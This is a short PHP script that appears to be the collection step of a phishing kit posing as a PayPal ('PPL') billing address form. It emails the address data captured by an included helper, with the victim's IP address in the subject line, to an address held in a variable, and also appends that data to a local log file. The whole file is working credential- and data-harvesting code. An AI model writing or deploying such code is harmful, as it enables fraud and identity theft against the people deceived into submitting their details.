<?php
include("functionsend.php");
include("mail.php");
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: $from\r\n";
$subject = "PPL Billing Address Form :".getenv("REMOTE_ADDR");
@mail($to,$subject,functionsend::address(),$head);
$f = fopen($save, "a+");
fwrite($f, functionsend::address());
fclose($f);
?>